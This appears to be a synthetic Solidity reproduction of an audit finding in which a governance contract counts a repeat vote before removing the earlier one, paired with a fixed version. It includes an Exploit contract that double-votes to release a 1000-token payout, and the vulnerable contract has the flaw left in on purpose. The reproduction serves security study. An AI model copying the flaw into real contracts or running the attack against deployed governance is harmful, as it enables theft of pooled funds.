// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Smoothly PoolGovernance — a repeat vote is counted before the old one is removed
    (Pashov, finding 26460).
    SYNTHETIC, cheatcode-free. proposeEpoch increments voteCounter before it
    decrements the previous vote (@> VULN). One operator of three votes twice
    for the same choice. The threshold sees 2, which is one higher than the
    operator's stake of 1, and 2/3 is 66 percent, so the proposal pays 1000.
    The control removes the previous vote first and the count stays 1, so
    nothing is paid. */

contract MockToken {
    string public name = "POOL";
    string public symbol = "POOL";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PoolGovernance {
    MockToken public token;
    address public payee;
    address[] public operators;
    uint256 public epochNumber;
    uint256 public payout = 1_000 ether;
    mapping(uint256 => mapping(address => bytes32)) public votes;
    mapping(uint256 => mapping(bytes32 => uint256)) public voteCounter;
    uint256 public lastCount;
    bool public executed;

    constructor(address _token, address _payee) {
        token = MockToken(_token);
        payee = _payee;
    }

    function addOperator(address op) external {
        operators.push(op);
    }

    function proposeEpoch(bytes32 vote) external {
        bytes32 prevVote = votes[epochNumber][msg.sender];
        // @> VULN: the new vote is counted before the previous vote is removed
        uint256 count = ++voteCounter[epochNumber][vote];
        uint256 operatorsLen = operators.length;
        votes[epochNumber][msg.sender] = vote;
        if (prevVote != bytes32(0)) --voteCounter[epochNumber][prevVote];
        lastCount = count;
        if (count * 100 / operatorsLen >= 66) {
            executed = true;
            token.transfer(payee, payout);
        }
    }
}

contract PoolGovernanceFixed {
    MockToken public token;
    address public payee;
    address[] public operators;
    uint256 public epochNumber;
    uint256 public payout = 1_000 ether;
    mapping(uint256 => mapping(address => bytes32)) public votes;
    mapping(uint256 => mapping(bytes32 => uint256)) public voteCounter;
    uint256 public lastCount;
    bool public executed;

    constructor(address _token, address _payee) {
        token = MockToken(_token);
        payee = _payee;
    }

    function addOperator(address op) external {
        operators.push(op);
    }

    function proposeEpoch(bytes32 vote) external {
        bytes32 prevVote = votes[epochNumber][msg.sender];
        uint256 operatorsLen = operators.length;
        votes[epochNumber][msg.sender] = vote;
        if (prevVote != bytes32(0)) --voteCounter[epochNumber][prevVote];
        // FIX: count the vote only after the previous one has been removed
        uint256 count = ++voteCounter[epochNumber][vote];
        lastCount = count;
        if (count * 100 / operatorsLen >= 66) {
            executed = true;
            token.transfer(payee, payout);
        }
    }
}

contract Exploit {
    MockToken public token;
    PoolGovernance public gov;
    address public sink;
    address public op2;
    address public op3;
    bytes32 public constant CHOICE = keccak256("epoch");
    uint256 public constant STAKE = 1;

    constructor() {
        token = new MockToken();
        sink = address(new Receiver());
        gov = new PoolGovernance(address(token), sink);
        op2 = address(new Receiver());
        op3 = address(new Receiver());
        token.mint(address(gov), gov.payout());
    }

    function run() external {
        gov.addOperator(address(this));
        gov.addOperator(op2);
        gov.addOperator(op3);
        gov.proposeEpoch(CHOICE);
        require(gov.lastCount() == STAKE, "first vote is the stake");
        require(gov.executed() == false, "not yet");
        gov.proposeEpoch(CHOICE);
        require(gov.lastCount() == STAKE + 1, "one higher than the stake");
        require(gov.executed() == true, "result flipped");
        require(token.balanceOf(sink) == 1_000 ether, "1000 paid");
        require(gov.voteCounter(0, CHOICE) == STAKE, "stored counter is 1");
    }
}

contract Receiver {}
